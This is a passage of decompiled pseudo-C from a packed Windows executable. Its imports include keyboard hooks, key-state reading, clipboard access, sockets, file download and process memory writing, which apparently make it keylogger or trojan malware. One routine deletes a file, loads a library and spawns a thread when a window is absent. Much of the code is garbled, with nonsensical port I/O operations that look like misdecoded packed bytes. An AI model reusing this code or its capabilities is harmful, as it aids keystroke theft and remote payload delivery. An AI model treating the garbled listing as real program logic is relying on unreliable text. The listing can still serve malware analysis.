        char * v12 = (char *)(result + 62); // 0x407a98
        unsigned char v13 = *v12; // 0x407a98
        char v14 = v13 + v6; // 0x407a98
        *v12 = v14;
        if (v14 < 0) {
            // 0x407a9d
            return result;
        }
        if (v14 >= v13) {
            int16_t v15 = v11; // 0x407ae1
            *(char *)v8 = __asm_insb(v15);
            *(char *)v8 = __asm_insb(v15);
            int32_t v16 = result;
            *(char *)v16 = *(char *)&result + (char)v16;
            __asm_outsd(v15, v9);
            int32_t v17; // 0x407a1f
            *(int32_t *)v17 = __asm_insd((int16_t)a10);
            char * v18 = (char *)result2; // 0x407af0
            *v18 = *v18 + (char)result2;
            __asm_outsd((int16_t)a3, *(int32_t *)a6);
            return result2;
        }
        char v19 = *(char *)&v9; // 0x407b12
        int32_t v20 = result;
        *(char *)v20 = *(char *)&result + (char)v20;
        char * v21 = (char *)(v10 + 104); // 0x407b19
        *v21 = *v21 + (char)(v11 / 256);
        int16_t v22 = v11; // 0x407b1c
        *(char *)v8 = __asm_insb(v22);
        *(char *)v8 = __asm_insb(v22);
        v9 ^= v11;
        *(char *)v8 = __asm_insb(v22);
        *(char *)v8 = __asm_insb(v22);
        char v23 = v11; // 0x407b25
        *v21 = *v21 + v23;
        *(char *)v8 = __asm_insb(v22);
        *(char *)v8 = __asm_insb(v22);
        int32_t v24; // 0x407a1f
        if (v24 < -1) {
            // 0x407b93
            return result;
        }
        int32_t v25 = 256 * (int32_t)(v19 ^ v6) | v4 & -0xff01; // 0x407b12
        __asm_arpl(*(int16_t *)(v24 + 117), (int16_t)v9);
        int32_t v26 = result;
        *(char *)v26 = *(char *)&result + (char)v26;
        char * v27 = (char *)(v25 + 82); // 0x407b35
        *v27 = *v27 + v23;
        uint32_t result3 = result - 1; // 0x407b38
        char * v28 = (char *)(v25 + 0x40810d); // 0x407b45
        *v28 = *v28 + (char)(result3 / 256);
        return result3;
    }
    unsigned char v29 = *(char *)&v8; // 0x407a26
    int32_t v30 = result; // 0x407a28
    unsigned char v31 = (char)v30; // 0x407a28
    bool v32 = v29 > v6 | v31 > 153;
    char v33; // 0x407a1f
    int32_t v34; // 0x407a1f
    if ((v6 & 15) - (v29 & 15) > 15 || (v31 & 14) > 9) {
        char v35 = (v32 ? -102 : -6) + v31; // 0x407a28
        v34 = v30 & -256 | (int32_t)v35;
        v33 = v35;
    } else {
        char v36 = v32 ? v31 - 96 : v31; // 0x407a28
        v34 = v30 & -256 | (int32_t)v36;
        v33 = v36;
    }
    result = v34;
    int16_t v37 = v11; // 0x407a2b
    *(int32_t *)v8 = __asm_insd(v37);
    if (((v6 - v29 ^ v6) & (v29 ^ v6)) >= 0) {
        char * v38 = (char *)(v11 + 0x76d2a101); // 0x407aa2
        *v38 = *v38 + (char)(v11 / 256);
        return result + 2;
    }
    // 0x407a5c
    __asm_outsb(v37, __readgsbyte(v9));
    if (v33 == 0) {
        int32_t v39 = result;
        return (v39 + (v32 ? 130 : 129) & 255 | v39 & -256) + 1;
    }
    if (v32) {
        int32_t v40 = result;
        return v40 + v5 & 255 | v40 & -256;
    }
    // 0x407a62
    v8 = 117;
    *(int32_t *)54 = *(int32_t *)54 ^ v9;
    char * v41 = (char *)(result - 38); // 0x407a69
    char v42 = *v41 + v6; // 0x407a69
    char v43 = llvm_ctpop_i8(v42); // 0x407a69
    *v41 = v42;
    if ((v43 & 1) == 0) {
        // 0x407aae
        return result;
    }
    char * v44 = (char *)(result - 26); // 0x407a6e
    char v45 = *v44 + v6; // 0x407a6e
    char v46 = llvm_ctpop_i8(v45); // 0x407a6e
    *v44 = v45;
    if ((v46 & 1) != 0) {
        char * v47 = (char *)(result - 14); // 0x407a73
        char v48 = *v47 + v6; // 0x407a73
        *v47 = v48;
        if (v48 < 0) {
            // 0x407ab8
            return result;
        }
        char * v49 = (char *)(v4 + (int32_t)"LoginCtrl.DLL"); // 0x407a78
        *v49 = *v49 + (char)(v10 / 256);
        g30 = &g7;
        *(int32_t *)((int32_t)&v1 - 4) = (int32_t)"user32.dll";
        return &g7;
    }
    char * v50 = (char *)(result + 26); // 0x407ab3
    char v51 = *v50 + v6; // 0x407ab3
    char v52 = llvm_ctpop_i8(v51); // 0x407ab3
    *v50 = v51;
    if ((v52 & 1) == 0) {
        // 0x407ab8
        return result;
    }
    if (v51 == 0) {
        int32_t v53 = __readfsdword(result); // bp-8, 0x407b71
        __writefsdword(result, (int32_t)&v53);
        return result;
    }
    // 0x407afd
    *(char *)v8 = __asm_insb(v37);
    char * v54 = (char *)result; // 0x407aff
    *v54 = *v54 + (char)result;
    return result;
}

// Address range: 0x407b96 - 0x407b9e
int32_t function_407b96(void) {
    // 0x407b96
    g115--;
    int32_t result; // 0x407b96
    return result;
}

// Address range: 0x407b9e - 0x407ba8
int32_t function_407b9e(void) {
    // 0x407b9e
    int32_t result; // 0x407b9e
    return result;
}

// Address range: 0x407baa - 0x407bc9
int32_t function_407baa(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x407bb5
    __writefsdword(0, (int32_t)&v1);
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x407bc9 - 0x407bce
int32_t function_407bc9(void) {
    // 0x407bc9
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x407bce - 0x407bd0
int32_t function_407bce(void) {
    // 0x407bce
    int32_t result; // 0x407bce
    return result;
}

// Address range: 0x407bd0 - 0x407bd2
int32_t function_407bd0(int32_t a1) {
    // 0x407bd0
    int32_t result; // 0x407bd0
    return result;
}

// Address range: 0x407be2 - 0x407be9
int32_t function_407be2(void) {
    // 0x407be2
    return function_96004041();
}

// Address range: 0x407c84 - 0x407f5b
int32_t function_407c84(int32_t a1, uint32_t a2, int32_t a3, uint32_t lpFilename, int32_t a5, int32_t a6, int32_t a7) {
    int32_t v1 = a3;
    int32_t v2 = a5;
    int32_t v3 = a7;
    uint32_t v4 = a1 + 1; // 0x407c88
    char * v5 = (char *)(a6 + 0x6a004069); // 0x407c89
    *v5 = *v5 + (char)(v4 / 256);
    uint32_t v6 = 0x406e7e * *(int32_t *)v4; // 0x407c8f
    char * v7 = (char *)a6; // 0x407c96
    __asm_outsb((int16_t)a3, *v7);
    char v8 = lpFilename / 256; // 0x407c99
    char v9 = v8 + (char)a3; // 0x407c99
    if (v9 != 0) {
        // 0x407cdd
        return v6 & -256 | (int32_t)*v7;
    }
    char v10 = a2; // 0x407c9d
    unsigned char v11 = v9 + v10; // 0x407c9d
    if (v11 != 0) {
        // 0x407ce9
        return -0x764bba77;
    }
    int32_t result = v6 | 1; // 0x407c98
    int32_t v12 = a3 & -256; // 0x407c99
    char * v13 = (char *)((v12 | (int32_t)v11) + 0x5a004076); // 0x407ca1
    unsigned char v14 = *v13; // 0x407ca1
    unsigned char v15 = v14 + v10; // 0x407ca1
    *v13 = v15;
    if (v15 < v14 || v15 == 0) {
        // 0x407ce9
        return result;
    }
    unsigned char v16 = v11 + v10; // 0x407ca9
    if (v16 < v11 || v16 == 0) {
        // 0x407ced
        return result + a2 / 256 & 255 | v6 & -256;
    }
    int32_t v17 = v12 | (int32_t)v16; // 0x407ca9
    char * v18 = (char *)(v17 - 0x15ffbf8a); // 0x407cad
    char v19 = *v18 + (char)lpFilename; // 0x407cad
    *v18 = v19;
    if (v19 < 0) {
        // 0x407ce9
        return result;
    }
    char * v20 = (char *)(v17 - 0x69ffbf88); // 0x407cb5
    char v21 = *v20 + v8; // 0x407cb5
    char v22 = llvm_ctpop_i8(v21); // 0x407cb5
    *v20 = v21;
    if ((v22 & 1) == 0) {
        char * v23 = (char *)(a6 + 123); // 0x407cbd
        *v23 = *v23 + (char)(v6 / 256);
        int32_t v24 = result + 1; // 0x407cc0
        char * v25 = (char *)v24; // 0x407cc1
        *v25 = *v25 + 2 * (char)v24;
        char * v26 = (char *)(v17 + 0x5500407b); // 0x407cc5
        *v26 = *v26 + (char)(a2 / 256);
        return 0;
    }
    // 0x407cfd
    v1 = __readfsdword(0);
    __writefsdword(0, (int32_t)&v1);
    v2 = 0;
    *(char *)(GetModuleFileNameA((int32_t *)260, (char *)lpFilename, 0) + lpFilename) = 0;
    function_4035fe();
    function_407156();
    function_403512();
    int32_t v27; // 0x407c84
    int32_t v28; // 0x407c84
    if ((char)function_4071ce() == 0) {
        int32_t v29 = &v2; // 0x407d11
        function_40623e();
        v28 = v29;
        if ((char)function_4071ce() == 0) {
            goto lab_0x407f40;
        } else {
            // 0x407df3
            *(int32_t *)g33 = -1;
            v27 = v29;
            goto lab_0x407dfe;
        }
    } else {
        // 0x407d56
        *(int32_t *)g32 = -1;
        function_4035fe();
        function_407196();
        function_403512();
        function_403662();
        DeleteFileA((char *)function_403816());
        function_403662();
        int32_t lpLibFileName = function_403816(); // 0x407dbf
        v3 = lpLibFileName;
        g31 = (int32_t)LoadLibraryA((char *)lpLibFileName);
        v27 = &v3;
        goto lab_0x407dfe;
    }
  lab_0x407f40:
    // 0x407f40
    __writefsdword(0, *(int32_t *)v28);
    *(int32_t *)(v28 + 8) = 0x407f62;
    return function_4034e2();
  lab_0x407dfe:
    // 0x407dfe
    *(int32_t *)(v27 - 4) = 260;
    *(int32_t *)(v27 - 8) = lpFilename;
    int32_t v30 = v27 - 12; // 0x407e09
    *(int32_t *)v30 = (int32_t)g81;
    int32_t nameSize = GetModuleFileNameA(&g117, (char *)&g117, (int32_t)&g117); // 0x407e0a
    *(char *)(nameSize + lpFilename) = 0;
    function_4035fe();
    function_407196();
    function_403512();
    function_403662();
    int32_t v31; // 0x407c84
    if (g33 == 0) {
        // 0x407e97
        v28 = v30;
        if (g32 == 0) {
            goto lab_0x407f40;
        } else {
            // 0x407ea5
            if (g36 >= 1) {
                // 0x407ebe
                function_404e86();
                function_403762();
                *(int32_t *)g37 = -1;
            }
            // 0x407ef1
            *(int32_t *)(v27 - 16) = 3;
            *(int32_t *)(v27 - 20) = 0x3ec1;
            int32_t v32 = v27 - 24; // 0x407efd
            *(int32_t *)v32 = g31;
            int32_t * v33 = FindResourceA(&g117, (char *)&g117, (char *)&g117); // 0x407efe
            v31 = v32;
            if (v33 != NULL) {
                goto lab_0x407f31;
            } else {
                // 0x407f07
                *(int32_t *)(v27 - 28) = 14;
                *(int32_t *)(v27 - 32) = 0x3ec1;
                int32_t v34 = v27 - 36; // 0x407f13
                *(int32_t *)v34 = g31;
                int32_t * v35 = FindResourceA(&g117, (char *)&g117, (char *)&g117); // 0x407f14
                v31 = v34;
                if (v35 != NULL) {
                    goto lab_0x407f31;
                } else {
                    // 0x407f1d
                    *(int32_t *)(v27 - 40) = 0x3ec1;
                    int32_t v36 = v27 - 44; // 0x407f27
                    *(int32_t *)v36 = g31;
                    int32_t * iconHandle = LoadIconA(&g117, (char *)&g117); // 0x407f28
                    v31 = v36;
                    v28 = v36;
                    if (iconHandle == NULL) {
                        goto lab_0x407f40;
                    } else {
                        goto lab_0x407f31;
                    }
                }
            }
        }
    } else {
        // 0x407e64
        *(int32_t *)(v27 - 16) = (int32_t)"xr, wo xiang ni";
        int32_t v37 = v27 - 20; // 0x407e69
        *(int32_t *)v37 = (int32_t)"ListBox";
        int32_t * v38 = FindWindowA((char *)&g117, (char *)&g117); // 0x407e6e
        v28 = v37;
        if (v38 == NULL) {
            // 0x407e7b
            *(int32_t *)(v27 - 24) = (int32_t)&g116;
            *(int32_t *)(v27 - 28) = 0;
            *(int32_t *)(v27 - 32) = 66;
            *(int32_t *)(v27 - 36) = 0x406836;
            *(int32_t *)(v27 - 40) = 0;
            int32_t v39 = v27 - 44; // 0x407e8b
            *(int32_t *)v39 = 0;
            CreateThread((struct _SECURITY_ATTRIBUTES *)&g117, (int32_t)&g117, (int32_t (*)(int32_t *))&g117, &g117, (int32_t)&g117, &g117);
            v28 = v39;
        }
        goto lab_0x407f40;
    }
  lab_0x407f31:
    // 0x407f31
    g82 = 0x407b9e;
    v28 = v31;
    goto lab_0x407f40;
}

// Address range: 0x407f5b - 0x407f60
int32_t function_407f5b(void) {
    // 0x407f5b
    return function_402ed2((int32_t)&g117, (int32_t)&g117);
}

// Address range: 0x407f60 - 0x407f62
int32_t function_407f60(void) {
    // 0x407f60
    int32_t result; // 0x407f60
    return result;
}

// Address range: 0x40e000 - 0x40e009
int32_t function_40e000(int32_t * a1) {
    // 0x40e000
    int32_t result; // 0x40e000
    return result;
}

// Address range: 0x40e009 - 0x40e086
int32_t entry_point(void) {
    // 0x40e009
    int32_t v1; // 0x40e009
    return function_40e000(&v1);
}

// Address range: 0x96004041 - 0x96004042
int32_t function_96004041(void) {
    // 0x96004041
    int32_t result; // 0x96004041
    return result;
}

// Address range: 0xafceb517 - 0xafceb518
int32_t function_afceb517(void) {
    // 0xafceb517
    int32_t result; // 0xafceb517
    return result;
}

// Address range: 0xb8f9fe79 - 0xb8f9fe7a
int32_t function_b8f9fe79(void) {
    // 0xb8f9fe79
    int32_t result; // 0xb8f9fe79
    return result;
}

// Address range: 0xce239cad - 0xce239cae
int32_t function_ce239cad(void) {
    // 0xce239cad
    int32_t result; // 0xce239cad
    return result;
}

// --------------- Dynamically Linked Functions ---------------

// LRESULT CallNextHookEx(_In_opt_ HHOOK hhk, _In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lParam);
// BOOL CloseClipboard(VOID);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// int CompareStringA(_In_ LCID Locale, _In_ DWORD dwCmpFlags, PCNZCH lpString1, _In_ int cchCount1, PCNZCH lpString2, _In_ int cchCount2);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// BOOL CopyFileA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ BOOL bFailIfExists);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HWND CreateWindowExA(_In_ DWORD dwExStyle, _In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName, _In_ DWORD dwStyle, _In_ int X, _In_ int Y, _In_ int nWidth, _In_ int nHeight, _In_opt_ HWND hWndParent, _In_opt_ HMENU hMenu, _In_opt_ HINSTANCE hInstance, _In_opt_ LPVOID lpParam);
// LRESULT DefWindowProcA(_In_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID DeleteCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// LRESULT DispatchMessageA(_In_ const MSG * lpMsg);
// VOID EnterCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL EnumWindows(_In_ WNDENUMPROC lpEnumFunc, _In_ LPARAM lParam);
// VOID ExitProcess(_In_ UINT uExitCode);
// int32_t ExitProcess2(void);
// HRSRC FindResourceA(_In_opt_ HMODULE hModule, _In_ LPCSTR lpName, _In_ LPCSTR lpType);
// HWND FindWindowA(_In_opt_ LPCSTR lpClassName, _In_opt_ LPCSTR lpWindowName);
// HWND FindWindowExA(_In_opt_ HWND hWndParent, _In_opt_ HWND hWndChildAfter, _In_opt_ LPCSTR lpszClass, _In_opt_ LPCSTR lpszWindow);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// VOID FreeLibraryAndExitThread(_In_ HMODULE hLibModule, _In_ DWORD dwExitCode);
// BOOL GetCaretPos(_Out_ LPPOINT lpPoint);
// BOOL GetCharWidthA(_In_ HDC hdc, _In_ UINT iFirst, _In_ UINT iLast, LPINT lpBuffer);
// DWORD GetClassLongA(_In_ HWND hWnd, _In_ int nIndex);
// int GetClassNameA(_In_ HWND hWnd, LPSTR lpClassName, _In_ int nMaxCount);
// HANDLE GetClipboardData(_In_ UINT uFormat);
// LPSTR GetCommandLineA(VOID);
// HANDLE GetCurrentProcess(VOID);
// DWORD GetCurrentThreadId(VOID);
// HDC GetDC(_In_opt_ HWND hWnd);
// DWORD GetFileSize(_In_ HANDLE hFile, _Out_opt_ LPDWORD lpFileSizeHigh);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// BOOL GetKeyboardState(PBYTE lpKeyState);
// int GetKeyboardType(_In_ int nTypeFlag);
// int GetLocaleInfoA(_In_ LCID Locale, _In_ LCTYPE LCType, LPSTR lpLCData, _In_ int cchData);
// BOOL GetMessageA(_Out_ LPMSG lpMsg, _In_opt_ HWND hWnd, _In_ UINT wMsgFilterMin, _In_ UINT wMsgFilterMax);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HWND GetParent(_In_ HWND hWnd);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
// HGDIOBJ GetStockObject(_In_ int i);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// LCID GetThreadLocale(void);
// DWORD GetTickCount(VOID);
// int32_t GetTickCount2(void);
// HWND GetTopWindow(_In_opt_ HWND hWnd);
// NOT_BUILD_WINDOWS_DEPRECATE DWORD GetVersion(VOID);
// HWND GetWindow(_In_ HWND hWnd, _In_ UINT uCmd);
// LONG GetWindowLongA(_In_ HWND hWnd, _In_ int nIndex);
// DWORD GetWindowThreadProcessId(_In_ HWND hWnd, _Out_opt_ LPDWORD lpdwProcessId);
// HGLOBAL GlobalAlloc(_In_ UINT uFlags, _In_ SIZE_T dwBytes);
// HGLOBAL GlobalFree(HGLOBAL hMem);
// LPVOID GlobalLock(_In_ HGLOBAL hMem);
// BOOL GlobalUnlock(_In_ HGLOBAL hMem);
// u_short htons(_In_ u_short hostshort);
// PVOID ImageDirectoryEntryToData(_In_ PVOID Base, _In_ BOOLEAN MappedAsImage, _In_ USHORT DirectoryEntry, _Out_ PULONG Size);
// char * inet_ntoa(_In_ struct in_addr in);
// VOID InitializeCriticalSection(_Out_ LPCRITICAL_SECTION lpCriticalSection);
// BOOL IsWindow(_In_opt_ HWND hWnd);
// BOOL IsWindowVisible(_In_ HWND hWnd);
// BOOL KillTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR uIDEvent);
// VOID LeaveCriticalSection(_Inout_ LPCRITICAL_SECTION lpCriticalSection);
// HICON LoadIconA(_In_opt_ HINSTANCE hInstance, _In_ LPCSTR lpIconName);
// HMODULE LoadLibraryA(_In_ LPCSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// int32_t LocalAlloc2(void);
// HLOCAL LocalFree(HLOCAL hMem);
// int32_t LocalFree2(void);
// int lstrcmpiA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int MessageBoxA(_In_opt_ HWND hWnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType);
// BOOL OpenClipboard(_In_opt_ HWND hWndNewOwner);
// BOOL PathFileExistsA(_In_ LPCSTR pszPath);
// BOOL PostMessageA(_In_opt_ HWND hWnd, _In_ UINT Msg, _In_ WPARAM wParam, _In_ LPARAM lParam);
// VOID PostQuitMessage(_In_ int nExitCode);
// BOOL QueryPerformanceCounter(_Out_ LARGE_INTEGER * lpPerformanceCount);
// VOID RaiseException(_In_ DWORD dwExceptionCode, _In_ DWORD dwExceptionFlags, _In_ DWORD nNumberOfArguments, const ULONG_PTR * lpArguments);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int recv(_In_ SOCKET s, char * buf, _In_ int len, _In_ int flags);
// LSTATUS RegCloseKey(_In_ HKEY hKey);
// int32_t RegCloseKey2(void);
// LSTATUS RegCreateKeyExA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey, DWORD Reserved, _In_opt_ LPSTR lpClass, _In_ DWORD dwOptions, _In_ REGSAM samDesired, _In_opt_ const LPSECURITY_ATTRIBUTES lpSecurityAttributes, _Out_ PHKEY phkResult, _Out_opt_ LPDWORD lpdwDisposition);
// LSTATUS RegDeleteKeyA(_In_ HKEY hKey, _In_ LPCSTR lpSubKey);
// LSTATUS RegOpenKeyExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpSubKey, _In_opt_ DWORD ulOptions, _In_ REGSAM samDesired, _Out_ PHKEY phkResult);
// int32_t RegOpenKeyExA2(void);
// LSTATUS RegQueryValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, LPDWORD lpReserved, _Out_opt_ LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
// int32_t RegQueryValueExA2(void);
// LSTATUS RegSetValueExA(_In_ HKEY hKey, _In_opt_ LPCSTR lpValueName, DWORD Reserved, _In_ DWORD dwType, const BYTE * lpData, _In_ DWORD cbData);
// int ReleaseDC(_In_opt_ HWND hWnd, _In_ HDC hDC);
// HGDIOBJ SelectObject(_In_ HDC hdc, _In_ HGDIOBJ h);
// int send(_In_ SOCKET s, const char * buf, _In_ int len, _In_ int flags);
// LRESULT SendMessageA(_In_ HWND hWnd, _In_ UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL SetEndOfFile(_In_ HANDLE hFile);
// UINT_PTR SetTimer(_In_opt_ HWND hWnd, _In_ UINT_PTR nIDEvent, _In_ UINT uElapse, _In_opt_ TIMERPROC lpTimerFunc);
// LONG SetWindowLongA(_In_ HWND hWnd, _In_ int nIndex, _In_ LONG dwNewLong);
// HHOOK SetWindowsHookExA(_In_ int idHook, _In_ HOOKPROC lpfn, _In_opt_ HINSTANCE hmod, _In_ DWORD dwThreadId);
// HINSTANCE ShellExecuteA(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpOperation, _In_ LPCSTR lpFile, _In_opt_ LPCSTR lpParameters, _In_opt_ LPCSTR lpDirectory, _In_ INT nShowCmd);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// SOCKET socket(_In_ int af, _In_ int type, _In_ int protocol);
// void SysFreeString(_In_opt_ BSTR bstrString);
// INT SysReAllocStringLen(_Inout_ BSTR * pbstr, const OLECHAR * psz, _In_ unsigned int len);
// DWORD TlsAlloc(VOID);
// BOOL TlsFree(_In_ DWORD dwTlsIndex);
// LPVOID TlsGetValue(_In_ DWORD dwTlsIndex);
// BOOL TlsSetValue(_In_ DWORD dwTlsIndex, _In_opt_ LPVOID lpTlsValue);
// int ToAscii(_In_ UINT uVirtKey, _In_ UINT uScanCode, const BYTE * lpKeyState, _Out_ LPWORD lpChar, _In_ UINT uFlags);
// BOOL UnhookWindowsHookEx(_In_ HHOOK hhk);
// HRESULT URLDownloadToFileA(_In_opt_ LPUNKNOWN, _In_ LPCSTR, _In_opt_ LPCSTR, DWORD, _In_opt_ LPBINDSTATUSCALLBACK);
// int32_t URLDownloadToFileA2(void);
// LPVOID VirtualAlloc(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
// BOOL VirtualFree(LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD dwFreeType);
// BOOL VirtualProtect(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int32_t WriteFile2(void);
// BOOL WriteProcessMemory(_In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T * lpNumberOfBytesWritten);
// int WSACleanup(void);
// int WSAStartup(_In_ WORD wVersionRequested, _Out_ LPWSADATA lpWSAData);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: maskpe
// Detected functions: 631
